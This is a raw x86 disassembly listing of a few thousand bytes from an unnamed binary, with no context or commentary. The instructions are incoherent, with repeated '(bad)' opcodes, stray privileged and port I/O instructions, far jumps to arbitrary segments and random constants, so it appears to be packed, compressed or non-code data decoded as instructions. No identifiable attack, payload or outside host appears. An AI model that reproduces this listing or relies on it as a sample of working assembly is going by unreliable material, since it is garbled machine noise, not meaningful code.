  416911:	sub    ebp,DWORD PTR [ebp+0x29ce72b7]
  416917:	sysenter 
  416919:	mov    ch,ch
  41691b:	test   eax,0x56ed3f5f
  416920:	adc    eax,0xe97394dd
  416925:	cdq    
  416926:	cmp    eax,0xa45cb7c0
  41692b:	mov    edi,0x9b962516
  416930:	xor    edi,ebx
  416932:	cmp    BYTE PTR [ecx+0x5863016d],ah
  416938:	add    DWORD PTR [eax+0x20],edi
  41693b:	push   ss
  41693c:	iret   
  41693d:	lods   eax,DWORD PTR ds:[esi]
  41693e:	xchg   ecx,eax
  41693f:	lods   al,BYTE PTR ds:[esi]
  416940:	div    BYTE PTR [eax+0x7620298f]
  416946:	imul   edx,DWORD PTR [edi+0x66],0x3c
  41694a:	adc    DWORD PTR [edx+0x15],ecx
  41694d:	push   0xe4925077
  416952:	inc    ebp
  416953:	fs pop ds
  416955:	in     eax,dx
  416956:	and    DWORD PTR [eax+0x603c1b27],edi
  41695c:	push   0x5b
  41695e:	loope  0x41694c
  416960:	mov    esp,0x6ae3e877
  416965:	xchg   bh,ah
  416967:	mov    ebp,0xb69b8051
  41696c:	lea    eax,[edi]
  41696e:	fld    DWORD PTR [esi+0x21]
  416971:	fadd   DWORD PTR [esp+edi*8+0x6d]
  416975:	cmp    edx,ebp
  416977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416978:	jne    0x4169e8
  41697a:	daa    
  41697b:	jne    0x4169ee
  41697d:	jb     0x41694d
  41697f:	jns    0x416916
  416981:	repz sbb ecx,DWORD PTR [ebp-0x43f21193]
  416988:	(bad)  
  416989:	sti    
  41698a:	mov    ebx,0x18311647
  41698f:	mov    eax,ds:0xfdc303e
  416994:	dec    edi
  416995:	sbb    al,0x2b
  416997:	test   DWORD PTR [eax+0x6b88b67e],ecx
  41699d:	enter  0x9782,0xe5
  4169a1:	cmp    dh,ah
  4169a3:	xor    al,al
  4169a5:	mov    al,ds:0x8028d878
  4169aa:	fs mov esp,0xacfeca84
  4169b0:	push   edx
  4169b1:	js     0x416963
  4169b3:	sbb    eax,0x845cc910
  4169b8:	fwait
  4169b9:	and    DWORD PTR [edx],0xffffff98
  4169bc:	inc    edi
  4169bd:	clc    
  4169be:	mov    cl,0x1a
  4169c0:	mov    dl,0xc0
  4169c2:	nop
  4169c3:	mov    bh,0xf5
  4169c5:	imul   esp,DWORD PTR [esi+esi*4-0x74],0xcb7e03f
  4169cd:	push   ss
  4169ce:	and    bh,BYTE PTR [esi]
  4169d0:	pop    esp
  4169d1:	push   eax
  4169d2:	jb     0x4169b5
  4169d4:	xchg   edx,eax
  4169d5:	popf   
  4169d6:	repnz fdiv st,st(5)
  4169d9:	mov    ebp,0x5610fe11
  4169de:	and    edx,DWORD PTR [ebp+0x1c61918f]
  4169e4:	(bad)  
  4169e5:	sub    eax,0xb09c3efc
  4169ea:	std    
  4169eb:	js     0x4169c8
  4169ed:	jne    0x4169ea
  4169ef:	mov    cl,0x16
  4169f1:	mov    bh,BYTE PTR [edi+0x137839eb]
  4169f7:	xor    al,0x49
  4169f9:	daa    
  4169fa:	and    BYTE PTR ds:0x62522153,0xa0
  416a01:	and    BYTE PTR [ecx+ebx*8],al
  416a04:	cmp    eax,0x851ed843
  416a09:	clc    
  416a0a:	sar    eax,1
  416a0c:	mov    edi,0x62a27290
  416a11:	inc    ecx
  416a12:	imul   ebx,DWORD PTR [esi-0x237902e5],0xe
  416a19:	test   al,0xd2
  416a1b:	ins    DWORD PTR es:[edi],dx
  416a1c:	mov    ds:0xa23165d6,eax
  416a21:	pop    esp
  416a22:	push   es
  416a23:	shr    BYTE PTR [ebx],cl
  416a25:	mov    edx,DWORD PTR [edx+0x883cd2b]
  416a2b:	jle    0x416a47
  416a2d:	retf   
  416a2e:	mov    esi,0x882c2ca5
  416a33:	js     0x416a3f
  416a35:	in     eax,0xe8
  416a37:	sub    BYTE PTR [eax],bl
  416a39:	inc    edi
  416a3a:	push   eax
  416a3b:	mov    cl,0x18
  416a3d:	jmp    0x416a37
  416a3f:	xor    cl,0x48
  416a42:	xchg   esi,eax
  416a43:	lds    ebx,FWORD PTR [eax]
  416a45:	inc    ebp
  416a46:	xchg   ebp,eax
  416a47:	out    dx,eax
  416a48:	jns    0x416a93
  416a4a:	sbb    BYTE PTR [ecx-0x16],dh
  416a4d:	sbb    ecx,DWORD PTR [edi]
  416a4f:	test   eax,0xeb347532
  416a54:	daa    
  416a55:	or     ebp,DWORD PTR [ecx+0x7]
  416a58:	push   ecx
  416a59:	shl    BYTE PTR [eax-0x6672d617],cl
  416a5f:	mov    dl,0x4d
  416a61:	sub    esp,DWORD PTR [edi]
  416a63:	push   eax
  416a64:	jo     0x416a1d
  416a66:	test   eax,0xcc1ebd31
  416a6b:	shl    BYTE PTR ds:0x3def34c2,cl
  416a71:	mov    esp,?
  416a73:	xor    al,BYTE PTR [esi+0x6f]
  416a76:	inc    esp
  416a77:	pop    edx
  416a78:	push   ecx
  416a79:	in     eax,dx
  416a7a:	popa   
  416a7b:	cmp    DWORD PTR [eax],edx
  416a7d:	jecxz  0x416a98
  416a7f:	loopne 0x416a47
  416a81:	loope  0x416a86
  416a83:	lds    edx,FWORD PTR [edx]
  416a85:	mov    ecx,0xb70c05df
  416a8a:	mov    dl,0x2a
  416a8c:	mov    WORD PTR [edx+ebp*2],fs
  416a8f:	xchg   edi,eax
  416a90:	mov    ebp,0xdb97d405
  416a95:	mov    DWORD PTR [esi-0x384666f6],edx
  416a9b:	xchg   edi,eax
  416a9c:	adc    al,0x0
  416a9e:	push   es
  416a9f:	cmp    BYTE PTR [esi],ch
  416aa1:	xchg   BYTE PTR [ecx+0x1],al
  416aa4:	ret    0x5974
  416aa7:	fcom   DWORD PTR [edx-0x10]
  416aaa:	daa    
  416aab:	and    BYTE PTR [esi+ebx*2],0x30
  416aaf:	repz aaa 
  416ab1:	push   0xffffff9e
  416ab3:	loop   0x416b1d
  416ab5:	inc    esp
  416ab6:	sub    BYTE PTR [edx+edi*2+0x6d],dl
  416aba:	adc    dl,cl
  416abc:	dec    eax
  416abd:	imul   esi,DWORD PTR [ebx+ebx*4+0x76],0xe71bd814
  416ac5:	xchg   DWORD PTR [esi+0x2996c3cc],esi
  416acb:	(bad)  
  416acc:	in     al,dx
  416acd:	and    ebp,DWORD PTR [ebp+0x67]
  416ad0:	dec    edi
  416ad1:	fcom   QWORD PTR [ebx-0x7b]
  416ad4:	dec    ebp
  416ad5:	dec    eax
  416ad6:	xchg   ecx,eax
  416ad7:	xchg   edi,eax
  416ad8:	or     DWORD PTR [ebp+0x432f2dc9],edx
  416ade:	mov    edi,DWORD PTR [eax+0x3]
  416ae1:	popa   
  416ae2:	fsubr  QWORD PTR [eax+0x12]
  416ae5:	push   edi
  416ae6:	outs   dx,DWORD PTR ds:[esi]
  416ae7:	fdiv   QWORD PTR [edx]
  416ae9:	sbb    DWORD PTR [esi+0x102c319e],edi
  416aef:	xabort 0x67
  416af2:	pop    es
  416af3:	jmp    0x416b3d
  416af5:	jecxz  0x416a82
  416af7:	dec    edi
  416af8:	sub    DWORD PTR [edx],0x28
  416afb:	aaa    
  416afc:	mov    cs,WORD PTR [ebp-0x51]
  416aff:	ja     0x416a9e
  416b01:	rcr    DWORD PTR [ebp+0x2c6724a3],1
  416b07:	sbb    ch,ch
  416b09:	aam    0xda
  416b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0c:	push   0xffffffd7
  416b0e:	out    dx,al
  416b0f:	cmc    
  416b10:	sar    BYTE PTR [eax-0x4c2ee7d6],1
  416b16:	fist   WORD PTR [eax]
  416b18:	cmp    eax,DWORD PTR [edx-0x5f]
  416b1b:	jmp    0x26926620
  416b20:	outs   dx,DWORD PTR ds:[esi]
  416b21:	call   0x99f8b72e
  416b26:	fimul  WORD PTR [esi]
  416b28:	ret    0x916d
  416b2b:	jns    0x416aec
  416b2d:	sub    bh,0x57
  416b30:	aas    
  416b31:	push   ebp
  416b32:	mov    esi,0xc344ace1
  416b37:	test   eax,0x3e4744fa
  416b3c:	sar    DWORD PTR [esi-0x7d57c03e],cl
  416b42:	pop    es
  416b43:	ror    BYTE PTR [esi],cl
  416b45:	or     al,0x63
  416b47:	mov    DWORD PTR [eax-0x5b252cb6],edi
  416b4d:	test   bh,dl
  416b4f:	into   
  416b50:	push   eax
  416b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b52:	sub    DWORD PTR [esi],eax
  416b54:	es xchg ecx,eax
  416b56:	push   es
  416b57:	add    al,ah
  416b59:	mov    al,0x5
  416b5b:	sub    dh,ch
  416b5d:	je     0x416b09
  416b5f:	mov    bh,0x31
  416b61:	mov    dl,0x59
  416b63:	xlat   BYTE PTR ds:[ebx]
  416b64:	sahf   
  416b65:	xchg   BYTE PTR [ecx-0x32],dh
  416b68:	xor    DWORD PTR [ebx-0x3a713905],esi
  416b6e:	lock fsubr DWORD PTR [ecx+0x73f0abf7]
  416b75:	dec    ebx
  416b76:	inc    ecx
  416b77:	rcr    esp,1
  416b79:	xchg   esi,esi
  416b7b:	xor    eax,0xf9ba1806
  416b80:	dec    ebp
  416b81:	xchg   esi,eax
  416b82:	push   ds
  416b83:	jo     0x416bdf
  416b85:	or     BYTE PTR [ebx+0x7c],ch
  416b88:	jge    0x416b97
  416b8a:	dec    edx
  416b8b:	into   
  416b8c:	mov    esp,0x371d793a
  416b91:	pop    esi
  416b92:	scas   al,BYTE PTR es:[edi]
  416b93:	fiadd  DWORD PTR [eax]
  416b95:	in     al,0xbd
  416b97:	in     eax,dx
  416b98:	pop    ecx
  416b99:	push   ebp
  416b9a:	ret    
  416b9b:	sub    dl,cl
  416b9d:	loope  0x416b76
  416b9f:	mov    al,ds:0x46d06645
  416ba4:	mov    al,ds:0xd2ea9934
  416ba9:	ins    BYTE PTR es:[edi],dx
  416baa:	sbb    eax,0x7272b257
  416baf:	inc    edx
  416bb0:	(bad)  
  416bb1:	cmp    eax,0xde81ad13
  416bb6:	add    eax,0x1a7d6d55
  416bbb:	test   DWORD PTR [ecx+0x72],edx
  416bbe:	dec    edi
  416bbf:	outs   dx,DWORD PTR ds:[esi]
  416bc0:	stc    
  416bc1:	test   ah,cl
  416bc3:	add    DWORD PTR [ebx],0x5b5ca30f
  416bc9:	mov    WORD PTR ds:0x48f843d7,ds
  416bcf:	ds jns 0x416bb7
  416bd2:	inc    ebp
  416bd3:	ja     0x416c1c
  416bd5:	or     eax,0x6851bb99
  416bda:	retf   0x2e71
  416bdd:	scas   eax,DWORD PTR es:[edi]
  416bde:	aaa    
  416bdf:	ror    dh,1
  416be1:	int3   
  416be2:	or     al,0x11
  416be4:	xchg   edx,eax
  416be5:	jne    0x416b6c
  416be7:	inc    eax
  416be8:	and    esi,edx
  416bea:	stos   BYTE PTR es:[edi],al
  416beb:	pop    ds
  416bec:	(bad)  
  416bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bee:	inc    ecx
  416bef:	mov    edi,0x2a9bb687
  416bf4:	sbb    ecx,esi
  416bf6:	inc    eax
  416bf7:	lds    eax,FWORD PTR [edi+0x282031b1]
  416bfd:	pushf  
  416bfe:	jne    0x416b90
  416c00:	into   
  416c01:	inc    edx
  416c02:	mov    edx,0x532f25d6
  416c07:	push   edi
  416c08:	add    DWORD PTR [eax+0xc],ebp
  416c0b:	sub    eax,0x2dc8c848
  416c10:	add    ecx,0xffffffb6
  416c13:	push   ebp
  416c14:	xchg   edi,eax
  416c15:	add    ch,BYTE PTR [ebp+ebp*2-0x3e78c9e0]
  416c1c:	pop    ebx
  416c1d:	push   cs
  416c1e:	adc    eax,0xc917a2cf
  416c23:	aaa    
  416c24:	mov    ebp,0x6d824a2
  416c29:	mov    eax,0x7a1b692
  416c2e:	adc    al,0x2
  416c30:	pop    ecx
  416c31:	jo     0x416ca4
  416c33:	xchg   esp,eax
  416c34:	mov    al,ds:0x88ee7fd2
  416c39:	shl    BYTE PTR [eax],1
  416c3b:	push   eax
  416c3c:	dec    ebx
  416c3d:	shl    bl,cl
  416c3f:	mov    edx,0xc0d90d94
  416c44:	in     al,dx
  416c45:	js     0x416bca
  416c47:	pop    ss
  416c48:	pop    ss
  416c49:	sub    BYTE PTR [edx+0x12871f4],ch
  416c4f:	in     eax,dx
  416c50:	je     0x416c54
  416c52:	dec    esp
  416c53:	pop    ds
  416c54:	js     0x416c1f
  416c56:	dec    ecx
  416c57:	ja     0x416c23
  416c59:	push   ecx
  416c5a:	adc    DWORD PTR [edi],esi
  416c5c:	push   esi
  416c5d:	retf   0xc8fc
  416c60:	add    al,0x5b
  416c62:	xor    esi,DWORD PTR [edx]
  416c64:	jo     0x416c41
  416c66:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c68:	nop
  416c69:	in     al,dx
  416c6a:	fwait
  416c6b:	mov    ecx,0xed10ad0b
  416c70:	xchg   edi,eax
  416c71:	push   cs
  416c72:	adc    eax,0x44685d63
  416c77:	daa    
  416c78:	fcomp  DWORD PTR [ecx+eax*4]
  416c7b:	or     eax,0x43190ab6
  416c80:	sbb    bh,BYTE PTR [edx+0x1e]
  416c83:	adc    esp,DWORD PTR [esi+0xbe90129]
  416c89:	inc    esi
  416c8a:	xchg   edi,eax
  416c8b:	fst    QWORD PTR [esi+0x7dc8524e]
  416c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c92:	ror    bh,1
  416c94:	addr16 xchg edi,eax
  416c96:	frstor [ecx+edi*1]
  416c99:	mov    edi,0xe1526eaa
  416c9e:	popa   
  416c9f:	(bad)  
  416ca0:	gs retf 
  416ca2:	ffree  st(7)
  416ca4:	ins    DWORD PTR es:[edi],dx
  416ca5:	nop
  416ca6:	xor    al,0xc2
  416ca8:	clc    
  416ca9:	in     al,0x41
  416cab:	push   ecx
  416cac:	in     al,0xc
  416cae:	xchg   esi,eax
  416caf:	pop    ecx
  416cb0:	dec    edi
  416cb1:	out    dx,al
  416cb2:	imul   ebp
  416cb4:	retf   
  416cb5:	shl    BYTE PTR [edi-0x42a66a91],cl
  416cbb:	stos   BYTE PTR es:[edi],al
  416cbc:	or     ebx,DWORD PTR [eax-0x251b5807]
  416cc2:	adc    dl,BYTE PTR [esi+0x42]
  416cc5:	mov    ss,WORD PTR [ebp-0x50]
  416cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cc9:	xchg   edi,eax
  416cca:	push   esp
  416ccb:	push   ss
  416ccc:	jp     0x416cc2
  416cce:	inc    esp
  416ccf:	dec    edx
  416cd0:	outs   dx,DWORD PTR ds:[esi]
  416cd1:	inc    edi
  416cd2:	xchg   BYTE PTR [edx],cl
  416cd4:	cmp    DWORD PTR [esi+0x2e],ebp
  416cd7:	dec    ebx
  416cd8:	loope  0x416c6e
  416cda:	jnp    0x416cd8
  416cdc:	(bad)  
  416cdd:	xor    ecx,DWORD PTR [ecx+eax*4-0x58]
  416ce1:	out    0x3a,al
  416ce3:	icebp  
  416ce4:	mov    cl,0x6f
  416ce6:	and    al,0xfc
  416ce8:	push   es
  416ce9:	sub    al,BYTE PTR [eax]
  416ceb:	fistp  WORD PTR ds:0x1c629cb9
  416cf1:	mov    DWORD PTR [edi+0x6c058c9e],0xb68ed5b3
  416cfb:	aas    
  416cfc:	dec    ebx
  416cfd:	push   0xb7a8fd79
  416d02:	sub    eax,ebp
  416d04:	xchg   ebp,eax
  416d05:	add    edi,edx
  416d07:	mov    ecx,0x7b21b141
  416d0c:	or     BYTE PTR [edi],dl
  416d0e:	jl     0x416cbf
  416d10:	push   edi
  416d11:	adc    al,0x26
  416d13:	xchg   edi,eax
  416d14:	(bad)  
  416d16:	neg    eax
  416d18:	fld    TBYTE PTR [ebp+0x1e1a3e0c]
  416d1e:	dec    edx
  416d1f:	fwait
  416d20:	mov    ds:0x6e3db7d6,eax
  416d25:	push   0xd20a6afa
  416d2a:	mov    gs,ebx
  416d2c:	or     DWORD PTR [eax-0x44],0x5c
  416d30:	retf   
  416d31:	mov    ah,0xb4
  416d33:	mov    cs,WORD PTR [edi+edi*2-0xe]
  416d37:	mov    al,ds:0xccb13c2f
  416d3c:	or     esi,DWORD PTR [edi-0x4cdb828]
  416d42:	and    DWORD PTR [ebp-0x439b5599],edx
  416d48:	xchg   DWORD PTR [ebx+0x7b3696c],ebx
  416d4e:	sbb    al,0x57
  416d50:	cld    
  416d51:	sbb    al,0xbb
  416d53:	int3   
  416d54:	xlat   BYTE PTR ds:[ebx]
  416d55:	bound  edi,QWORD PTR [eax-0x3c66afb3]
  416d5b:	xor    esp,DWORD PTR [ebx+0x31]
  416d5e:	jbe    0x416dd9
  416d60:	cmp    dh,bh
  416d62:	loopne 0x416d5b
  416d64:	mov    esp,0x940d8056
  416d69:	and    al,BYTE PTR ds:0x5c7d8cc6
  416d6f:	repnz fstp QWORD PTR [eax-0x320bd2ad]
  416d76:	in     eax,0x6b
  416d78:	xchg   edi,eax
  416d79:	jbe    0x416db3
  416d7b:	pop    ebp
  416d7c:	loope  0x416d1b
  416d7e:	das    
  416d7f:	sub    BYTE PTR [ebx+edx*1-0x3673c864],dh
  416d86:	sub    BYTE PTR [edx],0xeb
  416d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d8a:	push   cs
  416d8b:	pop    es
  416d8c:	mov    dl,0x20
  416d8e:	push   cs
  416d8f:	mov    al,ds:0x825405f7
  416d94:	push   edx
  416d95:	sbb    eax,0x5085186f
  416d9a:	dec    ecx
  416d9b:	fisub  DWORD PTR [edi+0x76]
  416d9e:	popf   
  416d9f:	lahf   
  416da0:	ret    
  416da1:	or     DWORD PTR [ebx+ebp*2],eax
  416da4:	jmp    0xd4b2:0x624759d2
  416dab:	icebp  
  416dac:	stc    
  416dad:	mov    ah,0xfd
  416daf:	sub    edx,DWORD PTR [edx-0x54]
  416db2:	cdq    
  416db3:	mov    dl,0xa
  416db5:	out    dx,eax
  416db6:	adc    eax,0x6954e695
  416dbb:	pushf  
  416dbc:	outs   dx,BYTE PTR ds:[esi]
  416dbd:	add    eax,0x16caa892
  416dc2:	dec    BYTE PTR [eax+0x6545a4b8]
  416dc8:	push   eax
  416dc9:	retf   
  416dca:	xor    eax,0x122c768d
  416dcf:	mov    es,WORD PTR [ecx+0x44]
  416dd2:	push   esp
  416dd3:	pushf  
  416dd4:	stos   DWORD PTR es:[edi],eax
  416dd5:	sbb    cl,BYTE PTR [edi]
  416dd7:	sti    
  416dd8:	dec    eax
  416dd9:	mov    ebp,0xd84789b2
  416dde:	pop    ss
  416ddf:	iret   
  416de0:	inc    ebp
  416de1:	mov    dl,0xb1
  416de3:	jle    0x416e03
  416de5:	fisub  DWORD PTR [ecx+0x4d]
  416de8:	push   esp
  416de9:	pop    esi
  416dea:	push   ds
  416deb:	mov    ds:0xc02406e8,al
  416df0:	bound  ebx,QWORD PTR [ebx+0x2f3cce01]
  416df6:	(bad)  
  416df7:	jg     0x416dfd
  416df9:	pop    eax
  416dfa:	mov    ecx,0x9f0c1843
  416dff:	pop    ss
  416e00:	fimul  WORD PTR [ecx]
  416e02:	pop    ebx
  416e03:	pop    ss
  416e04:	pushf  
  416e05:	cli    
  416e06:	scas   eax,DWORD PTR es:[edi]
  416e07:	std    
  416e08:	sahf   
  416e09:	xchg   BYTE PTR [edx],cl
  416e0b:	lock int 0xcb
  416e0e:	adc    al,0xb8
  416e10:	and    ecx,DWORD PTR [esi-0x37]
  416e13:	int    0x99
  416e15:	(bad)  
  416e16:	and    BYTE PTR [edi-0x8],bl
  416e19:	jbe    0x416dd7
  416e1b:	xlat   BYTE PTR ds:[ebx]
  416e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e1d:	sub    ebp,DWORD PTR [eax-0x5c]
  416e20:	xor    edi,ecx
  416e22:	loope  0x416e27
  416e24:	push   ebp
  416e25:	xor    dl,BYTE PTR [ebp-0xe]
  416e28:	ldmxcsr DWORD PTR [edx]
  416e2b:	xor    al,0x86
  416e2d:	call   0x1d8a:0xce8e58c0
  416e34:	adc    DWORD PTR [ebp-0x74],ecx
  416e37:	adc    DWORD PTR [ebx+eax*2-0x65],0xb67f4793
  416e3f:	enter  0xceee,0xc
  416e43:	and    al,0x54
  416e45:	pop    esi
  416e46:	pop    ebp
  416e47:	out    dx,al
  416e48:	addps  xmm3,XMMWORD PTR [eax]
  416e4b:	mov    ebp,eax
  416e4d:	int3   
  416e4e:	call   0x873ab387
  416e53:	aaa    
  416e54:	aam    0x72
  416e56:	pop    es
  416e57:	ret    
  416e58:	pop    ebp
  416e59:	jle    0x416e16
  416e5b:	xchg   edi,eax
  416e5c:	div    DWORD PTR [edx+esi*1+0x78]
  416e60:	mov    esi,0x3768e86f
  416e65:	pop    edi
  416e66:	jns    0x416eda
  416e68:	push   cs
  416e69:	dec    ebp
  416e6a:	rcl    bh,1
  416e6c:	ss inc edi
  416e6e:	xor    ebp,ebp
  416e70:	clc    
  416e71:	mov    dl,0x96
  416e73:	pop    ecx
  416e74:	into   
  416e75:	cmp    dh,ah
  416e77:	(bad)  
  416e79:	push   edx
  416e7a:	imul   esi,DWORD PTR [edi+0x4],0x2
  416e7e:	repz inc edx
  416e80:	jmp    0x5bf2:0x25186116
  416e87:	mov    bh,0xd8
  416e89:	fisttp QWORD PTR [esi]
  416e8b:	jb     0x416e4f
  416e8d:	push   ds
  416e8e:	mov    eax,ecx
  416e90:	xchg   ecx,eax
  416e91:	stos   BYTE PTR es:[edi],al
  416e92:	fwait
  416e93:	enter  0x8dad,0x40
  416e97:	xchg   BYTE PTR [edx+0x41],bh
  416e9a:	shl    DWORD PTR [edx+edx*4],cl
  416e9d:	fdiv   DWORD PTR [ebx+0x2be09348]
  416ea3:	push   ds
  416ea4:	push   eax
  416ea5:	(bad)  
  416ea6:	ins    BYTE PTR es:[edi],dx
  416ea7:	mov    DWORD PTR [ecx-0x6296d26],edi
  416ead:	or     esi,DWORD PTR [edx]
  416eaf:	push   0xe86e078e
  416eb4:	ror    DWORD PTR [esp+ebx*1+0x1b],cl
  416eb8:	jb     0x416e6e
  416eba:	cmp    eax,0xc614a54c
  416ebf:	loopne 0x416e45
  416ec1:	jo     0x416f3f
  416ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ec4:	sar    BYTE PTR [ebp+0x1d],1
  416ec7:	or     bl,BYTE PTR [ecx]
  416ec9:	pop    ds
  416eca:	and    DWORD PTR [edx],eax
  416ecc:	outs   dx,DWORD PTR ds:[esi]
  416ecd:	pop    esi
  416ece:	adc    bl,cl
  416ed0:	out    0x9a,al
  416ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ed4:	je     0x416e57
  416ed6:	int3   
  416ed7:	out    dx,eax
  416ed8:	jge    0x416e7e
  416eda:	cmp    eax,0xdc1a2e1b
  416edf:	call   0x8baf:0xcca9727b
  416ee6:	xchg   ebx,eax
  416ee7:	lods   eax,DWORD PTR ds:[esi]
  416ee8:	neg    BYTE PTR [ecx+edx*8+0x18]
  416eec:	sbb    ah,BYTE PTR [esi+0x7f]
  416eef:	ins    DWORD PTR es:[edi],dx
  416ef0:	pop    esi
  416ef1:	adc    ch,ah
  416ef3:	add    DWORD PTR ss:[eax+0xe],ecx
  416ef7:	imul   esp,DWORD PTR [esp+ebx*4],0x950dd7e5
  416efe:	sub    DWORD PTR gs:[esi],ebp
  416f01:	xor    eax,esp
  416f03:	mov    ebx,0x95c0faaa
  416f08:	adc    ebp,edi
  416f0a:	jb     0x416ef3
  416f0c:	or     bh,ah
  416f0e:	rcr    edx,0xb1
  416f11:	push   0xffffff9f
  416f13:	xchg   edx,eax
  416f14:	dec    ebx
  416f15:	call   0x47f676f4
  416f1a:	stos   BYTE PTR es:[edi],al
  416f1b:	fstp   DWORD PTR [esi+0x15]
  416f1e:	cdq    
  416f1f:	sbb    al,0x4c
  416f21:	rol    BYTE PTR [ecx+0x21],1
  416f24:	push   eax
  416f25:	inc    ebx
  416f26:	imul   eax,DWORD PTR [ecx+0xe],0xffffff89
  416f2a:	scas   eax,DWORD PTR es:[edi]
  416f2b:	inc    esp
  416f2c:	aaa    
  416f2d:	mov    al,0xb3
  416f2f:	retf   0x252b
  416f32:	ret    
  416f33:	arpl   WORD PTR [ebp+0x3fadbd3e],bp
  416f39:	fnstcw WORD PTR ds:0xd0f799e6
  416f3f:	sbb    ebx,DWORD PTR [ebx+ebp*2]
  416f42:	cmp    ebx,DWORD PTR [esp+edi*4]
  416f45:	sbb    al,0x41
  416f47:	dec    eax
  416f48:	cmp    al,0x9b
  416f4b:	inc    edx
  416f4c:	and    WORD PTR [ecx+0x42880ad1],bp
  416f53:	fld    TBYTE PTR [esi]
  416f55:	dec    ecx
  416f56:	ror    DWORD PTR [edx-0x74863088],0x15
  416f5d:	dec    ecx
  416f5e:	cmp    eax,0xe7750ba9
  416f63:	sti    
  416f64:	test   al,0x11
  416f66:	in     al,0x64
  416f68:	jmp    0x416ef0
  416f6a:	add    cl,bl
  416f6c:	(bad)  
  416f6d:	or     eax,ebx
  416f6f:	adc    DWORD PTR [edi-0x41],0x6df8ec9d
  416f76:	or     dh,dh
  416f78:	and    eax,0x50d65034
  416f7d:	jp     0x416f37
  416f7f:	(bad)  
  416f80:	mov    ebx,0xf4159636
  416f85:	outs   dx,DWORD PTR ds:[esi]
  416f86:	push   ebx
  416f87:	and    DWORD PTR [edi-0x6e99c33c],esp
  416f8d:	push   ss
  416f8e:	rol    BYTE PTR [edi],cl
  416f90:	enter  0xa876,0x28
  416f94:	in     al,dx
  416f95:	test   cl,ah
  416f97:	jmp    0x4c760afc
  416f9c:	sbb    BYTE PTR [eax],dl
  416f9e:	inc    eax
  416f9f:	retf   
  416fa0:	inc    edi
  416fa1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416fa3:	pop    ds
  416fa4:	data16 sar BYTE PTR [esi],0xab
  416fa8:	ds sahf 
  416faa:	outs   dx,BYTE PTR ds:[esi]
  416fab:	jmp    0xe0c2:0x487e052d
  416fb2:	add    eax,0x24787169
  416fb7:	xor    al,0x82
  416fb9:	clc    
  416fba:	add    al,0x2c
  416fbc:	test   DWORD PTR [esi+0x45bf9a62],0x5066f6c7
  416fc6:	sbb    ch,BYTE PTR [edi]
  416fc8:	xchg   ebx,eax
  416fc9:	sub    ecx,DWORD PTR [eax]
  416fcb:	dec    esp
  416fcc:	in     al,0xfb
  416fce:	sbb    cl,bh
  416fd0:	call   DWORD PTR [edi-0x1439271e]
  416fd6:	cld    
  416fd7:	lea    edx,[ebx-0x1206cd8a]
  416fdd:	or     eax,0xbef82a71
  416fe2:	aaa    
  416fe3:	mov    ebp,0x9b49b409
  416fe8:	push   0x21b76406
  416fed:	and    DWORD PTR [ebp-0x719d6f68],esi
  416ff3:	enter  0x4447,0xe5
  416ff7:	xchg   esp,eax
  416ff8:	aam    0xc6
  416ffa:	lea    esi,[esi+edi*8]
  416ffd:	and    DWORD PTR [esi-0x3f],0x2e65f02d
  417004:	push   ebp
  417005:	stc    
  417006:	mov    edi,edi
  417008:	mul    DWORD PTR [edx-0x12]
  41700b:	mov    eax,0xdaa5c451
  417010:	cmp    ebx,ebp
  417012:	fisttp QWORD PTR [edx]
  417014:	add    BYTE PTR [eax-0xbc280ca],dh
  41701a:	dec    eax
  41701b:	adc    al,0xa7
  41701d:	jnp    0x41706d
  41701f:	cmp    al,0x82
  417021:	mov    ds:0x7bb4242d,al
  417026:	add    al,0xd9
  417028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417029:	pop    ds
  41702a:	or     eax,DWORD PTR [ecx-0x1f]
  41702d:	jmp    0x41706e
  41702f:	and    DWORD PTR [edi-0x5b],edx
  417032:	bound  ebx,QWORD PTR [ecx]
  417034:	dec    ebx
  417035:	leave  
  417036:	mov    WORD PTR [ebx-0x55780d39],gs
  41703c:	xchg   DWORD PTR [ecx+ebp*2+0x3684d6fb],edi
  417043:	fstp   QWORD PTR [esi+0x17]
  417046:	and    al,0x55
  417048:	(bad)  
  41704a:	sbb    DWORD PTR [esi+0x68b3c04a],esi
  417050:	ss inc ecx
  417052:	shr    BYTE PTR [eax+0x54],cl
  417055:	push   ecx
  417056:	jbe    0x41706d
  417058:	mov    edi,0xd8e5f2eb
  41705d:	mov    esi,0x25034ede
  417062:	iret   
  417063:	mov    edx,0xadbb1183
  417068:	daa    
  417069:	imul   ebp,DWORD PTR [esi],0xffffffe5
  41706c:	cmp    eax,0x3729b559
  417071:	out    0xa3,eax
  417073:	xor    dl,BYTE PTR [ebx-0x5f085b8d]
  417079:	pop    ds
  41707a:	test   al,0xc0
  41707c:	xor    BYTE PTR [ecx+0x4e9cda5e],ah
  417082:	out    0xb4,eax
  417084:	push   ebp
  417085:	jg     0x41700c
  417087:	(bad)  
  417088:	pop    esp
  417089:	and    eax,0x548de677
  41708e:	xor    eax,0x7055395e
  417093:	ds push ebp
  417095:	das    
  417096:	jmp    0x9c3f10f2
  41709b:	mov    WORD PTR [ecx],ss
  41709d:	mov    edi,0x23ac5627
  4170a2:	sub    al,0x39
  4170a4:	lock adc bh,BYTE PTR [edi]
  4170a7:	xlat   BYTE PTR ds:[ebx]
  4170a8:	ror    DWORD PTR ds:[esi],0x96
  4170ac:	and    eax,0xd664c642
  4170b1:	shl    BYTE PTR [edx+eax*1+0x2],cl
  4170b5:	(bad)  
  4170b6:	(bad)  
  4170b7:	push   edi
  4170b8:	lock repnz dec ecx
  4170bb:	lock ja 0x4170c3
  4170be:	retf   
  4170bf:	hlt    
  4170c0:	cmovne esp,esi
  4170c3:	or     DWORD PTR [ebx],0xffffffb5
